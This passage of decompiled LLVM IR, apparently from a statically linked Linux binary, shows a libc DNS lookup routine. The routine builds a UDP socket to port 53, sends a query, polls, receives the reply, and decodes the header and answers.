  %v12_8057984 = icmp eq i16 %v3_8057984, 10
  %v1_805798d = icmp eq i1 %v12_8057984, false
  %v1_805799b = add i32 %v0_805799b, 158
  %v2_805799b = inttoptr i32 %v1_805799b to i16*
  store i16 13568, i16* %v2_805799b, align 2
  %v0_80579a5 = load i32, i32* @esp, align 4
  br i1 %v1_805798d, label %dec_label_pc_805799b, label %dec_label_pc_80579bb

dec_label_pc_805799b:                             ; preds = %dec_label_pc_8057984
  %v1_80579a8 = add i32 %v0_80579a5, 32
  %v2_80579a8 = inttoptr i32 %v1_80579a8 to i32*
  %v3_80579a8 = load i32, i32* %v2_80579a8, align 4
  %v5_80579a8 = add i32 %v0_80579a5, -16
  %v6_80579a8 = inttoptr i32 %v5_80579a8 to i32*
  store i32 %v3_80579a8, i32* %v6_80579a8, align 4
  %v1_80579ac = call i32 @inet_addr(i32 -1)
  store i32 %v1_80579ac, i32* %eax.global-to-local, align 4
  %v1_80579b1 = load i32, i32* @esp, align 4
  %v2_80579b1 = add i32 %v1_80579b1, 176
  %v3_80579b1 = inttoptr i32 %v2_80579b1 to i32*
  store i32 %v1_80579ac, i32* %v3_80579b1, align 4
  %v0_80579b8 = load i32, i32* @esp, align 4
  %v1_80579b8 = add i32 %v0_80579b8, 16
  br label %dec_label_pc_80579bb

dec_label_pc_80579bb:                             ; preds = %dec_label_pc_8057984, %dec_label_pc_805799b
  %v1_80579bb = phi i32 [ %v1_80579b8, %dec_label_pc_805799b ], [ %v0_80579a5, %dec_label_pc_8057984 ]
  %v0_80579bb = load i32, i32* @ecx, align 4
  %v2_80579bb = add i32 %v1_80579bb, -4
  %v3_80579bb = inttoptr i32 %v2_80579bb to i32*
  store i32 %v0_80579bb, i32* %v3_80579bb, align 4
  %v1_80579bc = add i32 %v1_80579bb, -8
  %v2_80579bc = inttoptr i32 %v1_80579bc to i32*
  store i32 17, i32* %v2_80579bc, align 4
  %v1_80579be = add i32 %v1_80579bb, -12
  %v2_80579be = inttoptr i32 %v1_80579be to i32*
  store i32 2, i32* %v2_80579be, align 4
  %v1_80579c0 = add i32 %v1_80579bb, 156
  %v2_80579c0 = inttoptr i32 %v1_80579c0 to i16*
  %v3_80579c0 = load i16, i16* %v2_80579c0, align 2
  %v4_80579c0 = zext i16 %v3_80579c0 to i32
  store i32 %v4_80579c0, i32* %eax.global-to-local, align 4
  %v2_80579c8 = add i32 %v1_80579bb, -16
  %v3_80579c8 = inttoptr i32 %v2_80579c8 to i32*
  store i32 %v4_80579c0, i32* %v3_80579c8, align 4
  %v3_80579c9 = call i32 @socket(i32 -1, i32 %v15_80577ac, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80579c9, i32* %eax.global-to-local, align 4
  %v1_80579ce = load i32, i32* @esp, align 4
  %v2_80579ce = add i32 %v1_80579ce, 36
  %v3_80579ce = inttoptr i32 %v2_80579ce to i32*
  store i32 %v3_80579c9, i32* %v3_80579ce, align 4
  %v0_80579d2 = load i32, i32* @esp, align 4
  %v1_80579d2 = add i32 %v0_80579d2, 16
  %v0_80579d5 = load i32, i32* %eax.global-to-local, align 4
  %v2_80579d5 = icmp slt i32 %v0_80579d5, 0
  br i1 %v2_80579d5, label %dec_label_pc_8057a02, label %dec_label_pc_80579d9

dec_label_pc_80579d9:                             ; preds = %dec_label_pc_80579bb
  %v1_80579d9 = add i32 %v0_80579d2, 172
  store i32 %v1_80579d9, i32* %eax.global-to-local, align 4
  %v0_80579e0 = load i32, i32* @edx, align 4
  %v2_80579e0 = add i32 %v0_80579d2, 12
  %v3_80579e0 = inttoptr i32 %v2_80579e0 to i32*
  store i32 %v0_80579e0, i32* %v3_80579e0, align 4
  %v1_80579e1 = add i32 %v0_80579d2, 8
  %v2_80579e1 = inttoptr i32 %v1_80579e1 to i32*
  store i32 28, i32* %v2_80579e1, align 4
  %v0_80579e3 = load i32, i32* %eax.global-to-local, align 4
  %v2_80579e3 = add i32 %v0_80579d2, 4
  %v3_80579e3 = inttoptr i32 %v2_80579e3 to i32*
  store i32 %v0_80579e3, i32* %v3_80579e3, align 4
  %v1_80579e4 = add i32 %v0_80579d2, 36
  %v2_80579e4 = inttoptr i32 %v1_80579e4 to i32*
  %v3_80579e4 = load i32, i32* %v2_80579e4, align 4
  %v6_80579e4 = inttoptr i32 %v0_80579d2 to i32*
  store i32 %v3_80579e4, i32* %v6_80579e4, align 4
  %v3_80579e8 = call i32 @__libc_connect(i32 -1, i32 %v15_80577ac, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80579e8, i32* %eax.global-to-local, align 4
  %v0_80579ed = load i32, i32* @esp, align 4
  %v2_80579f0 = icmp slt i32 %v3_80579e8, 0
  %v1_80579f2 = icmp eq i1 %v2_80579f0, false
  br i1 %v1_80579f2, label %dec_label_pc_8057a0b, label %dec_label_pc_80579f4

dec_label_pc_80579f4:                             ; preds = %dec_label_pc_80579d9
  %v1_80579f4 = call i32 @__errno_location(i32 -1)
  store i32 %v1_80579f4, i32* %eax.global-to-local, align 4
  %v1_80579f9 = inttoptr i32 %v1_80579f4 to i32*
  %v2_80579f9 = load i32, i32* %v1_80579f9, align 4
  %v11_80579f9 = icmp eq i32 %v2_80579f9, 101
  %v0_8057d6b.pre = load i32, i32* @esp, align 4
  br i1 %v11_80579f9, label %dec_label_pc_8057d6b, label %dec_label_pc_8057a02

dec_label_pc_8057a02:                             ; preds = %dec_label_pc_80579f4, %dec_label_pc_80579bb
  %v17_8057a02 = phi i32 [ %v1_80579d2, %dec_label_pc_80579bb ], [ %v0_8057d6b.pre, %dec_label_pc_80579f4 ]
  %v1_8057a02 = add i32 %v17_8057a02, 28
  %v2_8057a02 = inttoptr i32 %v1_8057a02 to i32*
  %v3_8057a02 = load i32, i32* %v2_8057a02, align 4
  %v4_8057a02 = add i32 %v3_8057a02, 1
  store i32 %v4_8057a02, i32* %v2_8057a02, align 4
  br label %dec_label_pc_8057d8c.backedge

dec_label_pc_8057a0b:                             ; preds = %dec_label_pc_80579d9
  %v1_8057a0b = add i32 %v0_80579ed, 12
  %v2_8057a0b = inttoptr i32 %v1_8057a0b to i32*
  store i32 0, i32* %v2_8057a0b, align 4
  %v0_8057a0d = load i32, i32* @ebx, align 4
  %v1_8057a0d = load i32, i32* @esi, align 4
  %v2_8057a0d = add i32 %v1_8057a0d, %v0_8057a0d
  store i32 %v2_8057a0d, i32* %eax.global-to-local, align 4
  %v2_8057a10 = add i32 %v0_80579ed, 8
  %v3_8057a10 = inttoptr i32 %v2_8057a10 to i32*
  store i32 %v2_8057a0d, i32* %v3_8057a10, align 4
  %v2_8057a11 = add i32 %v0_80579ed, 4
  %v3_8057a11 = inttoptr i32 %v2_8057a11 to i32*
  store i32 %v2_805771e, i32* %v3_8057a11, align 4
  %v1_8057a12 = add i32 %v0_80579ed, 36
  %v2_8057a12 = inttoptr i32 %v1_8057a12 to i32*
  %v3_8057a12 = load i32, i32* %v2_8057a12, align 4
  %v6_8057a12 = inttoptr i32 %v0_80579ed to i32*
  store i32 %v3_8057a12, i32* %v6_8057a12, align 4
  %v4_8057a16 = call i32 @__libc_send(i32 -1, i32 %v15_80577ac, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8057a16, i32* %eax.global-to-local, align 4
  %v0_8057a1b = load i32, i32* @esp, align 4
  %v1_8057a1b = add i32 %v0_8057a1b, 36
  %v2_8057a1b = inttoptr i32 %v1_8057a1b to i32*
  %v3_8057a1b = load i32, i32* %v2_8057a1b, align 4
  store i32 %v3_8057a1b, i32* %eax.global-to-local, align 4
  %v1_8057a1f = add i32 %v0_8057a1b, 232
  %v2_8057a1f = inttoptr i32 %v1_8057a1f to i16*
  store i16 1, i16* %v2_8057a1f, align 2
  %v0_8057a29 = load i32, i32* %eax.global-to-local, align 4
  %v1_8057a29 = load i32, i32* @esp, align 4
  %v2_8057a29 = add i32 %v1_8057a29, 228
  %v3_8057a29 = inttoptr i32 %v2_8057a29 to i32*
  store i32 %v0_8057a29, i32* %v3_8057a29, align 4
  %v0_8057a30 = load i32, i32* @esp, align 4
  %v1_8057a33 = add i32 %v0_8057a30, 8
  %v2_8057a33 = inttoptr i32 %v1_8057a33 to i32*
  store i32 10000, i32* %v2_8057a33, align 4
  %v1_8057a38 = add i32 %v0_8057a30, 4
  %v2_8057a38 = inttoptr i32 %v1_8057a38 to i32*
  store i32 1, i32* %v2_8057a38, align 4
  %v1_8057a3a = add i32 %v0_8057a30, 228
  store i32 %v1_8057a3a, i32* %eax.global-to-local, align 4
  %v3_8057a41 = inttoptr i32 %v0_8057a30 to i32*
  store i32 %v1_8057a3a, i32* %v3_8057a41, align 4
  %v0_8057a42 = call i32 @__libc_poll()
  store i32 %v0_8057a42, i32* %eax.global-to-local, align 4
  %v0_8057a47 = load i32, i32* @esp, align 4
  %v1_8057a47 = add i32 %v0_8057a47, 16
  %tmp48 = icmp slt i32 %v0_8057a42, 1
  br i1 %tmp48, label %dec_label_pc_8057d6b, label %dec_label_pc_8057a52

dec_label_pc_8057a52:                             ; preds = %dec_label_pc_8057a0b
  %v1_8057a52 = add i32 %v0_8057a47, 12
  %v2_8057a52 = inttoptr i32 %v1_8057a52 to i32*
  store i32 0, i32* %v2_8057a52, align 4
  %v1_8057a54 = add i32 %v0_8057a47, 8
  %v2_8057a54 = inttoptr i32 %v1_8057a54 to i32*
  store i32 512, i32* %v2_8057a54, align 4
  %v2_8057a59 = add i32 %v0_8057a47, 4
  %v3_8057a59 = inttoptr i32 %v2_8057a59 to i32*
  store i32 %v2_805771e, i32* %v3_8057a59, align 4
  %v1_8057a5a = add i32 %v0_8057a47, 36
  %v2_8057a5a = inttoptr i32 %v1_8057a5a to i32*
  %v3_8057a5a = load i32, i32* %v2_8057a5a, align 4
  %v6_8057a5a = inttoptr i32 %v0_8057a47 to i32*
  store i32 %v3_8057a5a, i32* %v6_8057a5a, align 4
  %v4_8057a5e = call i32 @__libc_recv(i32 -1, i32 %v15_80577ac, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8057a5e, i32* %eax.global-to-local, align 4
  %v1_8057a63 = load i32, i32* @esp, align 4
  %v2_8057a63 = add i32 %v1_8057a63, 32
  %v3_8057a63 = inttoptr i32 %v2_8057a63 to i32*
  store i32 %v4_8057a5e, i32* %v3_8057a63, align 4
  %v0_8057a67 = load i32, i32* @esp, align 4
  %v1_8057a67 = add i32 %v0_8057a67, 16
  %v7_8057a6d = icmp sgt i32 %v4_8057a5e, 11
  br i1 %v7_8057a6d, label %dec_label_pc_8057a73, label %dec_label_pc_8057d20

dec_label_pc_8057a73:                             ; preds = %dec_label_pc_8057a52
  %v0_8057a73 = load i32, i32* @ebx, align 4
  %v2_8057a73 = add i32 %v0_8057a67, 12
  %v3_8057a73 = inttoptr i32 %v2_8057a73 to i32*
  store i32 %v0_8057a73, i32* %v3_8057a73, align 4
  %v0_8057a74 = load i32, i32* @ebx, align 4
  %v2_8057a74 = add i32 %v0_8057a67, 8
  %v3_8057a74 = inttoptr i32 %v2_8057a74 to i32*
  store i32 %v0_8057a74, i32* %v3_8057a74, align 4
  %v1_8057a75 = add i32 %v0_8057a67, 84
  store i32 %v1_8057a75, i32* %eax.global-to-local, align 4
  %v2_8057a79 = add i32 %v0_8057a67, 4
  %v3_8057a79 = inttoptr i32 %v2_8057a79 to i32*
  store i32 %v1_8057a75, i32* %v3_8057a79, align 4
  %v3_8057a7a = inttoptr i32 %v0_8057a67 to i32*
  store i32 %v2_805771e, i32* %v3_8057a7a, align 4
  %v0_8057a7b = call i32 @__decode_header()
  store i32 %v0_8057a7b, i32* %eax.global-to-local, align 4
  %v0_8057a80 = load i32, i32* @esp, align 4
  %v1_8057a80 = add i32 %v0_8057a80, 84
  %v2_8057a80 = inttoptr i32 %v1_8057a80 to i32*
  %v3_8057a80 = load i32, i32* %v2_8057a80, align 4
  store i32 %v3_8057a80, i32* %edx.global-to-local, align 4
  %v2_8057a84 = add i32 %v0_8057a80, 60
  %v3_8057a84 = inttoptr i32 %v2_8057a84 to i32*
  store i32 %v3_8057a80, i32* %v3_8057a84, align 4
  %v0_8057a88 = load i32, i32* @esp, align 4
  %v1_8057a88 = add i32 %v0_8057a88, 16
  %v1_8057a8b = add i32 %v0_8057a88, 72
  %v2_8057a8b = inttoptr i32 %v1_8057a8b to i32*
  %v3_8057a8b = load i32, i32* %v2_8057a8b, align 4
  store i32 %v3_8057a8b, i32* %eax.global-to-local, align 4
  %v0_8057a8f = load i32, i32* %edx.global-to-local, align 4
  %v12_8057a8f = icmp eq i32 %v0_8057a8f, %v3_8057a8b
  %v1_8057a91 = icmp eq i1 %v12_8057a8f, false
  br i1 %v1_8057a91, label %dec_label_pc_8057d20, label %dec_label_pc_8057a97

dec_label_pc_8057a97:                             ; preds = %dec_label_pc_8057a73
  %v1_8057a97 = add i32 %v0_8057a88, 88
  %v2_8057a97 = inttoptr i32 %v1_8057a97 to i32*
  %v3_8057a97 = load i32, i32* %v2_8057a97, align 4
  %v4_8057a97 = icmp eq i32 %v3_8057a97, 0
  br i1 %v4_8057a97, label %dec_label_pc_8057d20, label %dec_label_pc_8057aa2

dec_label_pc_8057aa2:                             ; preds = %dec_label_pc_8057a97
  %v1_8057aa2 = add i32 %v0_8057a88, 112
  %v2_8057aa2 = inttoptr i32 %v1_8057aa2 to i32*
  %v3_8057aa2 = load i32, i32* %v2_8057aa2, align 4
  store i32 %v3_8057aa2, i32* %eax.global-to-local, align 4
  %v9_8057aa6 = icmp eq i32 %v3_8057aa2, 3
  %v1_8057aa9 = icmp eq i1 %v9_8057aa6, false
  br i1 %v1_8057aa9, label %dec_label_pc_8057b11, label %dec_label_pc_8057aab

dec_label_pc_8057aab:                             ; preds = %dec_label_pc_8057aa2
  %v1_8057aab = add i32 %v0_8057a88, 67
  %v2_8057aab = inttoptr i32 %v1_8057aab to i8*
  %v3_8057aab = load i8, i8* %v2_8057aab, align 1
  %v4_8057aab = icmp eq i8 %v3_8057aab, 0
  %v1_8057ab0 = icmp eq i1 %v4_8057aab, false
  br i1 %v1_8057ab0, label %dec_label_pc_8057b01, label %dec_label_pc_8057ab2

dec_label_pc_8057ab2:                             ; preds = %dec_label_pc_8057aab
  %v0_8057ab2 = load i32, i32* @ecx, align 4
  %v2_8057ab2 = add i32 %v0_8057a88, 12
  %v3_8057ab2 = inttoptr i32 %v2_8057ab2 to i32*
  store i32 %v0_8057ab2, i32* %v3_8057ab2, align 4
  %v1_8057ab3 = add i32 %v0_8057a88, 8
  %v2_8057ab3 = inttoptr i32 %v1_8057ab3 to i32*
  store i32 ptrtoint (i32* @global_var_8062de8.231 to i32), i32* %v2_8057ab3, align 4
  %v1_8057ab8 = add i32 %v0_8057a88, 4
  %v2_8057ab8 = inttoptr i32 %v1_8057ab8 to i32*
  store i32 134541533, i32* %v2_8057ab8, align 4
  %v1_8057abd = add i32 %v0_8057a88, 200
  store i32 %v1_8057abd, i32* @esi, align 4
  %v3_8057ac4 = inttoptr i32 %v0_8057a88 to i32*
  store i32 %v1_8057abd, i32* %v3_8057ac4, align 4
  %v4_8057ac5 = call i32 @__pthread_cleanup_push_defer(i32* inttoptr (i32 -1 to i32*), i32 %v15_80577ac, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8057ac5, i32* %eax.global-to-local, align 4
  %v0_8057aca = load i32, i32* @esp, align 4
  %v1_8057aca = inttoptr i32 %v0_8057aca to i32*
  store i32 ptrtoint (i32* @global_var_8062de8.231 to i32), i32* %v1_8057aca, align 4
  %v1_8057ad1 = call i32 @pthread_mutex_lock(i32 -1)
  store i32 %v1_8057ad1, i32* %eax.global-to-local, align 4
  %v0_8057ad6 = load i32, i32* @global_var_8067e64.317, align 4
  %v0_8057adc = load i32, i32* @esp, align 4
  %v1_8057adc = inttoptr i32 %v0_8057adc to i32*
  %v2_8057adc = load i32, i32* %v1_8057adc, align 4
  store i32 %v2_8057adc, i32* %eax.global-to-local, align 4
  %v3_8057adc = add i32 %v0_8057adc, 4
  %v1_8057add = inttoptr i32 %v3_8057adc to i32*
  %v2_8057add = load i32, i32* %v1_8057add, align 4
  store i32 %v2_8057add, i32* %edx.global-to-local, align 4
  %v1_8057ade = add i32 %v0_8057ad6, -1
  store i32 %v1_8057ade, i32* @ebx, align 4
  store i32 1, i32* %v1_8057add, align 4
  %v0_8057ae1 = load i32, i32* @esi, align 4
  store i32 %v0_8057ae1, i32* %v1_8057adc, align 4
  %v3_8057ae2 = call i32 @__pthread_cleanup_pop_restore(i32* inttoptr (i32 -1 to i32*), i32 %v15_80577ac)
  store i32 %v3_8057ae2, i32* %eax.global-to-local, align 4
  %v0_8057ae7 = load i32, i32* @esp, align 4
  %v1_8057aea = add i32 %v0_8057ae7, 52
  %v2_8057aea = inttoptr i32 %v1_8057aea to i32*
  %v3_8057aea = load i32, i32* %v2_8057aea, align 4
  %v4_8057aea = load i32, i32* @ebx, align 4
  %v5_8057aea = sub i32 %v3_8057aea, %v4_8057aea
  %v11_8057aea = xor i32 %v4_8057aea, %v3_8057aea
  %v12_8057aea = xor i32 %v5_8057aea, %v3_8057aea
  %v13_8057aea = and i32 %v12_8057aea, %v11_8057aea
  %v14_8057aea = icmp slt i32 %v13_8057aea, 0
  %v16_8057aea = icmp slt i32 %v5_8057aea, 0
  %v2_8057aee = icmp eq i1 %v16_8057aea, %v14_8057aea
  br i1 %v2_8057aee, label %dec_label_pc_8057b01, label %dec_label_pc_8057af0

dec_label_pc_8057af0:                             ; preds = %dec_label_pc_8057ab2
  %v1_8057af0 = add i32 %v0_8057ae7, 60
  %v2_8057af0 = inttoptr i32 %v1_8057af0 to i32*
  %v3_8057af0 = load i32, i32* %v2_8057af0, align 4
  store i32 %v3_8057af0, i32* %edx.global-to-local, align 4
  %v3_8057af4 = load i32, i32* %v2_8057aea, align 4
  %v4_8057af4 = add i32 %v3_8057af4, 1
  store i32 %v4_8057af4, i32* %v2_8057aea, align 4
  %v0_8057af8 = load i32, i32* %edx.global-to-local, align 4
  %v1_8057af8 = load i32, i32* @esp, align 4
  %v2_8057af8 = add i32 %v1_8057af8, 56
  %v3_8057af8 = inttoptr i32 %v2_8057af8 to i32*
  store i32 %v0_8057af8, i32* %v3_8057af8, align 4
  br label %dec_label_pc_8057d8c.backedge

dec_label_pc_8057b01:                             ; preds = %dec_label_pc_8057ab2, %dec_label_pc_8057aab
  %v0_8057b01 = call i32 @__GI___h_errno_location()
  store i32 %v0_8057b01, i32* %eax.global-to-local, align 4
  %v1_8057b06 = inttoptr i32 %v0_8057b01 to i32*
  store i32 1, i32* %v1_8057b06, align 4
  br label %dec_label_pc_8057dc4

dec_label_pc_8057b11:                             ; preds = %dec_label_pc_8057aa2
  %v1_8057b11 = icmp eq i32 %v3_8057aa2, 0
  %v1_8057b13 = icmp eq i1 %v1_8057b11, false
  br i1 %v1_8057b13, label %dec_label_pc_8057d20, label %dec_label_pc_8057b19

dec_label_pc_8057b19:                             ; preds = %dec_label_pc_8057b11
  %v1_8057b19 = add i32 %v0_8057a88, 120
  %v2_8057b19 = inttoptr i32 %v1_8057b19 to i32*
  %v3_8057b19 = load i32, i32* %v2_8057b19, align 4
  %tmp49 = icmp slt i32 %v3_8057b19, 1
  br i1 %tmp49, label %dec_label_pc_8057b29, label %dec_label_pc_8057b20

dec_label_pc_8057b20:                             ; preds = %dec_label_pc_8057b19
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_8057b48

dec_label_pc_8057b29:                             ; preds = %dec_label_pc_8057b19
  %v0_8057b29 = call i32 @__GI___h_errno_location()
  store i32 %v0_8057b29, i32* %eax.global-to-local, align 4
  %v1_8057b2e = inttoptr i32 %v0_8057b29 to i32*
  store i32 4, i32* %v1_8057b2e, align 4
  br label %dec_label_pc_8057dc4

dec_label_pc_8057b39:                             ; preds = %dec_label_pc_8057b48
  %v2_8057b39 = add i32 %v0_8057b50, -4
  %v3_8057b39 = inttoptr i32 %v2_8057b39 to i32*
  store i32 %v0_8057b39, i32* %v3_8057b39, align 4
  %v0_8057b3a = load i32, i32* @ebx, align 4
  %v1_8057b3a = add i32 %v0_8057b3a, 1
  store i32 %v1_8057b3a, i32* @ebx, align 4
  %v0_8057b3b = load i32, i32* %eax.global-to-local, align 4
  %v2_8057b3b = add i32 %v0_8057b50, -8
  %v3_8057b3b = inttoptr i32 %v2_8057b3b to i32*
  store i32 %v0_8057b3b, i32* %v3_8057b3b, align 4
  %v0_8057b3c = load i32, i32* @esi, align 4
  %v2_8057b3c = add i32 %v0_8057b50, -12
  %v3_8057b3c = inttoptr i32 %v2_8057b3c to i32*
  store i32 %v0_8057b3c, i32* %v3_8057b3c, align 4
  %v2_8057b3d = add i32 %v0_8057b50, -16
  %v3_8057b3d = inttoptr i32 %v2_8057b3d to i32*
  store i32 %v2_805771e, i32* %v3_8057b3d, align 4
  %v0_8057b3e = call i32 @__length_question()
  store i32 %v0_8057b3e, i32* %eax.global-to-local, align 4
  %v0_8057b43 = load i32, i32* @esp, align 4
  %v1_8057b43 = add i32 %v0_8057b43, 16
  %v0_8057b46 = load i32, i32* @esi, align 4
  %v2_8057b46 = add i32 %v0_8057b46, %v0_8057b3e
  %v0_8057b48.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8057b48

dec_label_pc_8057b48:                             ; preds = %dec_label_pc_8057b20, %dec_label_pc_8057b39
  %v0_8057b39 = phi i32 [ %v3_8057aa2, %dec_label_pc_8057b20 ], [ %v0_8057b3e, %dec_label_pc_8057b39 ]
  %v0_8057b50 = phi i32 [ %v1_8057a88, %dec_label_pc_8057b20 ], [ %v1_8057b43, %dec_label_pc_8057b39 ]
  %v0_8057b48 = phi i32 [ 0, %dec_label_pc_8057b20 ], [ %v0_8057b48.pre, %dec_label_pc_8057b39 ]
  %storemerge = phi i32 [ 12, %dec_label_pc_8057b20 ], [ %v2_8057b46, %dec_label_pc_8057b39 ]
  store i32 %storemerge, i32* @esi, align 4
  %v2_8057b48 = add i32 %v0_8057b50, 100
  %v3_8057b48 = inttoptr i32 %v2_8057b48 to i32*
  %v4_8057b48 = load i32, i32* %v3_8057b48, align 4
  %v5_8057b48 = sub i32 %v0_8057b48, %v4_8057b48
  %v11_8057b48 = xor i32 %v4_8057b48, %v0_8057b48
  %v12_8057b48 = xor i32 %v5_8057b48, %v0_8057b48
  %v13_8057b48 = and i32 %v12_8057b48, %v11_8057b48
  %v14_8057b48 = icmp slt i32 %v13_8057b48, 0
  %v16_8057b48 = icmp slt i32 %v5_8057b48, 0
  %v2_8057b4c = icmp eq i1 %v16_8057b48, %v14_8057b48
  br i1 %v2_8057b4c, label %dec_label_pc_8057b4e, label %dec_label_pc_8057b39

dec_label_pc_8057b4e:                             ; preds = %dec_label_pc_8057b48
  store i32 0, i32* @ebx, align 4
  %v1_8057b50 = add i32 %v0_8057b50, 27
  %v2_8057b50 = inttoptr i32 %v1_8057b50 to i8*
  store i8 1, i8* %v2_8057b50, align 1
  %v0_8057c7e.pre = load i32, i32* @ebx, align 4
  %v1_8057c7e.pre = load i32, i32* @esp, align 4
  %v2_8057c7e55 = add i32 %v1_8057c7e.pre, 104
  %v3_8057c7e56 = inttoptr i32 %v2_8057c7e55 to i32*
  %v4_8057c7e57 = load i32, i32* %v3_8057c7e56, align 4
  %v5_8057c7e58 = sub i32 %v0_8057c7e.pre, %v4_8057c7e57
  %v11_8057c7e60 = xor i32 %v4_8057c7e57, %v0_8057c7e.pre
  %v12_8057c7e61 = xor i32 %v5_8057c7e58, %v0_8057c7e.pre
  %v13_8057c7e62 = and i32 %v12_8057c7e61, %v11_8057c7e60
  %v14_8057c7e63 = icmp slt i32 %v13_8057c7e62, 0
  %v16_8057c7e65 = icmp slt i32 %v5_8057c7e58, 0
  %v2_8057c8266 = icmp eq i1 %v16_8057c7e65, %v14_8057c7e63
  br i1 %v2_8057c8266, label %dec_label_pc_8057c8e, label %dec_label_pc_8057c84.lr.ph

dec_label_pc_8057c84.lr.ph:                       ; preds = %dec_label_pc_8057b4e
  %v0_8057c84.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8057c84

dec_label_pc_8057b5a:                             ; preds = %dec_label_pc_8057c84
  %v1_8057b5a = add i32 %v0_8057b5a67, 116
  store i32 %v1_8057b5a, i32* %eax.global-to-local, align 4
  %v2_8057b5e = add i32 %v0_8057b5a67, -4
  %v3_8057b5e = inttoptr i32 %v2_8057b5e to i32*
  store i32 %v1_8057b5a, i32* %v3_8057b5e, align 4
  %v3_8057b5f = load i32, i32* %v3_8057c84, align 4
  %v5_8057b5f = add i32 %v0_8057b5a67, -8
  %v6_8057b5f = inttoptr i32 %v5_8057b5f to i32*
  store i32 %v3_8057b5f, i32* %v6_8057b5f, align 4
  %v0_8057b63 = load i32, i32* @esi, align 4
  %v2_8057b63 = add i32 %v0_8057b5a67, -12
  %v3_8057b63 = inttoptr i32 %v2_8057b63 to i32*
  store i32 %v0_8057b63, i32* %v3_8057b63, align 4
  %v2_8057b64 = add i32 %v0_8057b5a67, -16
  %v3_8057b64 = inttoptr i32 %v2_8057b64 to i32*
  store i32 %v2_805771e, i32* %v3_8057b64, align 4
  %v0_8057b65 = call i32 @__decode_answer()
  store i32 %v0_8057b65, i32* %eax.global-to-local, align 4
  %v1_8057b6a = load i32, i32* @esp, align 4
  %v2_8057b6a = add i32 %v1_8057b6a, 68
  %v3_8057b6a = inttoptr i32 %v2_8057b6a to i32*
  store i32 %v0_8057b65, i32* %v3_8057b6a, align 4
  %v0_8057b6e = load i32, i32* @esp, align 4
  %v1_8057b6e = add i32 %v0_8057b6e, 16
  %v2_8057b71 = icmp slt i32 %v0_8057b65, 0
  %v1_8057b73 = icmp eq i1 %v2_8057b71, false
  br i1 %v1_8057b73, label %dec_label_pc_8057b8d, label %dec_label_pc_8057b75

dec_label_pc_8057b75:                             ; preds = %dec_label_pc_8057b5a
  %v0_8057b75 = load i32, i32* @ebx, align 4
  %v1_8057b75 = icmp eq i32 %v0_8057b75, 0
  br i1 %v1_8057b75, label %dec_label_pc_8057d20, label %dec_label_pc_8057b7d

dec_label_pc_8057b7d:                             ; preds = %dec_label_pc_8057b75
  %v1_8057b7d = add i32 %v0_8057b6e, 100
  %v2_8057b7d = inttoptr i32 %v1_8057b7d to i32*
  %v3_8057b7d = load i32, i32* %v2_8057b7d, align 4
  %v4_8057b7d = icmp eq i32 %v3_8057b7d, 0
  br i1 %v4_8057b7d, label %dec_label_pc_8057d20, label %dec_label_pc_8057c8e

dec_label_pc_8057b8d:                             ; preds = %dec_label_pc_8057b5a
  %v1_8057b8d = add i32 %v0_8057b6e, 43
  %v2_8057b8d = inttoptr i32 %v1_8057b8d to i8*
  %v3_8057b8d = load i8, i8* %v2_8057b8d, align 1
  %v4_8057b8d = icmp eq i8 %v3_8057b8d, 0
  br i1 %v4_8057b8d, label %dec_label_pc_8057c2e, label %dec_label_pc_8057b98

dec_label_pc_8057b98:                             ; preds = %dec_label_pc_8057b8d
  %v0_8057b98 = load i32, i32* @edi, align 4
  %v1_8057b98 = add i32 %v0_8057b98, 28
  %v2_8057b98 = inttoptr i32 %v1_8057b98 to i32*
  %v3_8057b98 = load i32, i32* %v2_8057b98, align 4
  store i32 %v3_8057b98, i32* %eax.global-to-local, align 4
  %v2_8057b9b = add i32 %v0_8057b6e, 160
  %v3_8057b9b = inttoptr i32 %v2_8057b9b to i32*
  store i32 %v3_8057b98, i32* %v3_8057b9b, align 4
  %v0_8057ba2 = load i32, i32* @edi, align 4
  %v1_8057ba2 = add i32 %v0_8057ba2, 32
  %v2_8057ba2 = inttoptr i32 %v1_8057ba2 to i32*
  %v3_8057ba2 = load i32, i32* %v2_8057ba2, align 4
  store i32 %v3_8057ba2, i32* %eax.global-to-local, align 4
  %v1_8057ba5 = load i32, i32* @esp, align 4
  %v2_8057ba5 = add i32 %v1_8057ba5, 148
  %v3_8057ba5 = inttoptr i32 %v2_8057ba5 to i32*
  store i32 %v3_8057ba2, i32* %v3_8057ba5, align 4
  %v0_8057bac = load i32, i32* @edi, align 4
  %v1_8057bac = add i32 %v0_8057bac, 36
  %v2_8057bac = inttoptr i32 %v1_8057bac to i32*
  %v3_8057bac = load i32, i32* %v2_8057bac, align 4
  store i32 %v3_8057bac, i32* %eax.global-to-local, align 4
  %v1_8057baf = load i32, i32* @esp, align 4
  %v2_8057baf = add i32 %v1_8057baf, 152
  %v3_8057baf = inttoptr i32 %v2_8057baf to i32*
  store i32 %v3_8057bac, i32* %v3_8057baf, align 4
  %v0_8057bb6 = load i32, i32* @ecx, align 4
  %v1_8057bb6 = load i32, i32* @esp, align 4
  %v2_8057bb6 = add i32 %v1_8057bb6, -4
  %v3_8057bb6 = inttoptr i32 %v2_8057bb6 to i32*
  store i32 %v0_8057bb6, i32* %v3_8057bb6, align 4
  %v1_8057bb7 = add i32 %v1_8057bb6, -8
  %v2_8057bb7 = inttoptr i32 %v1_8057bb7 to i32*
  store i32 40, i32* %v2_8057bb7, align 4
  %v1_8057bb9 = add i32 %v1_8057bb6, 116
  store i32 %v1_8057bb9, i32* %edx.global-to-local, align 4
  %v2_8057bbd = add i32 %v1_8057bb6, -12
  %v3_8057bbd = inttoptr i32 %v2_8057bbd to i32*
  store i32 %v1_8057bb9, i32* %v3_8057bbd, align 4
  %v0_8057bbe = load i32, i32* @edi, align 4
  %v2_8057bbe = add i32 %v1_8057bb6, -16
  %v3_8057bbe = inttoptr i32 %v2_8057bbe to i32*
  store i32 %v0_8057bbe, i32* %v3_8057bbe, align 4
  %v4_8057bbf = call i32 @memcpy(i16* inttoptr (i32 -1 to i16*), i32 %v15_80577ac, i32 ptrtoint (i32* @0 to i32))
